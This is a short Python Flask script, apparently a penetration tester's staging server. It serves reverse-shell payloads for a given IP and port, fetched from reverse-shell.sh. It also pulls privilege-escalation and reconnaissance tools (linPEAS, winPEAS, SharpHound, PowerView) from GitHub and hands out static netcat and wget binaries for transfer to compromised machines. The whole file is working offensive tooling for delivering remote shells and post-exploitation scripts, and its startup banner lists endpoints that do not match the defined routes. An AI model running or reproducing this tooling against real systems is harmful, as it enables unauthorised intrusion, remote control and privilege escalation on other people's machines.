import requests
import io
from flask import Flask, send_file
import sys
app = Flask(__name__)




def get_raw_url_response(url):
    return requests.get(url).text

def download_binary_from_url(url, binary_name):
    return send_file(io.BytesIO(requests.get(url).content), 
                 mimetype='application/octet-stream', 
                 attachment_filename = binary_name)

@app.route("/shell/<ip>:<port>")
def reverse_shell(ip, port):
    return get_raw_url_response(f'https://reverse-shell.sh/{ip}:{port}')

@app.route("/get/script/<program_name>")
def get_program(program_name):
    if program_name == 'linpeas':
        return get_raw_url_response('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh')
    if program_name == 'winpeas':
        return get_raw_url_response('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASbat/winPEAS.bat')
    if program_name == 'sharpround':
        return get_raw_url_response('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1')
    if program_name == 'powerview':
        return get_raw_url_response('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')

@app.route("/get/binary/<sysop>/<binary_name>")
def get_binary(sysop, binary_name):
    if sysop == 'linux':
        if binary_name == 'nc' or binary_name == 'netcat':
            return download_binary_from_url('https://raw.githubusercontent.com/yunchih/static-binaries/master/nc', binary_name)
        if binary_name == 'wget':
            return download_binary_from_url('https://raw.githubusercontent.com/yunchih/static-binaries/master/wget', binary_name)
        return download_binary_from_url(f'https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/{binary_name}', binary_name)
    if sysop == 'windows':
        return ':)'



if __name__ == '__main__':
    print('Endpoints: /linpeas, /winpeas, /revshell and /revshell/<port>')
    cli = sys.modules['flask.cli']
    cli.show_server_banner = lambda *x: None
    # try:
    #   interface = next(filter(lambda x: x in net_interfaces, ['tun0', 'eth0', 'wlan0']))
    #   print(f"Your ip is: {ifaddresses(interface)[2][0]['addr']}")
    # except StopIteration:
    #   print('We couldn\'t find your net interface :(')
    # if len(sys.argv) > 1 and int(sys.argv[1]) < 65535 and int(sys.argv[1]) >= 1:
    #   try:
    #     app.run(host='0.0.0.0', port=sys.argv[1])
    #   except ValueError:
    #     print('You can only use numbers as ports.')

    app.run(host='0.0.0.0', port=5000, debug=True )